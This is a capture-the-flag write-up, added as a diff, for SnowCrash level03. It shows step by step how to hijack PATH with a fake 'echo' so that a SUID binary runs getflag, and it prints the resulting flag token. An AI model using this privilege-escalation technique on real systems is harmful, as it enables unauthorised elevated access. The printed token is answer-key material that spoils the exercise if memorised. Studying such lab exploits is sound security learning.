@@ -1,0 +1,78 @@
+As always we first ls -la to see what is all given to us and the permissions that is given with it
+level03@SnowCrash:~$ ls -la
+total 24
+dr-x------ 1 level03 level03  120 Mar  5  2016 .
+d--x--x--x 1 root    users    340 Aug 30  2015 ..
+-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
+-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
+-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
+-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
+
+# Notice that level03 is highlighted in RED! The reason for this is the rights of level03. 
+	It uses suid which is a massive danger and this is out gate way into the system. 
+	It shares user rights with the level03 executable and will allow us to use the getflag command. 
+	As this give us elevated user rights and allows us to exploit it.
+	It allows to run the programm as elevated rights, making it run as the user.
+
+we see that we have an executable. we will run it and see what happens 
+evel03@SnowCrash:~$ ./level03 
+Exploit me
+
+we see that it prints out 'Exploit me'.
+So now we will do just that.
+
+# If we look at the executable level03 in terms of what strings shows us. Run strings level03
+level03@SnowCrash:~$ strings level03
+/usr/bin/env echo Exploit me
+		We can see that the binary use `/usr/bin/env`
+		echo 'Exploit me' to print Exploit me we can change the location of echo with a fake one that will provide use
+		with the command getflag, because ./level03 does have the right of flag03 user
+
+ using the exploit of suid :
+ we see that there is a getflag command
+level03@SnowCrash:~$ echo '/bin/get'
+getfacl           getflag           get_mountoptions  
+ level03@SnowCrash:~$ ls -la /bin/getflag
+-rwxr-xr-x 1 root root 11833 Aug 30  2015 /bin/getflag  #Has the following rights
+
+So we will make our own echo
+ echo '/bin/getflag' > /tmp/echo;
+
+ Now we have to give rights to the echo we made
+ chmod +x /tmp/echo;
+level03@SnowCrash:~$ ls -la /tmp/echo
+-rwxrwxr-x 1 level03 level03 13 Oct 23 13:06 /tmp/echo #Now has Full rights to make it executable
+
+We have to change the PATH now to out PATH we want
+# We will run echo $PATH
+level03@SnowCrash:~$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+# We will put our own path into it
+export PATH=/tmp:$PATH;
+# We will run echo $PATH again to see if it took our change
+level03@SnowCrash:~$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+
+run the executable now and you get
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+level03@SnowCrash:~$ echo '/bin/getflag' > /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp:$PATH; ./level03 
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+Note lesson learned 
+There are 2 exploits in this level03
+	The first being privilege escalation the suid being set for level03 executable.
+	The second being Path Lookup Attacks, the system command not running an explicit match for the path of the command being executed. 
+		This was understood from minishell. 
+
+
+# look into exploiting with malloc, Rob gave this advice
+
+further read
+https://www.pentestpartners.com/security-blog/exploiting-suid-executables/
+https://www.mattandreko.com/2011/12/02/exploit-exercises-nebula-01/
+https://www.usna.edu/Users/cs/aviv/classes/ic221/s16/lec/24/lec.html
+https://blog.skullsecurity.org/2015/defcon-quals-babyecho-format-string-vulns-in-gory-detail
+https://isc.sans.edu/forums/diary/Shellshock+A+Collection+of+Exploits+seen+in+the+wild/18725/
+https://ss64.com/bash/echo.html
+https://askubuntu.com/questions/443789/what-does-chmod-x-filename-do-and-how-do-i-use-it
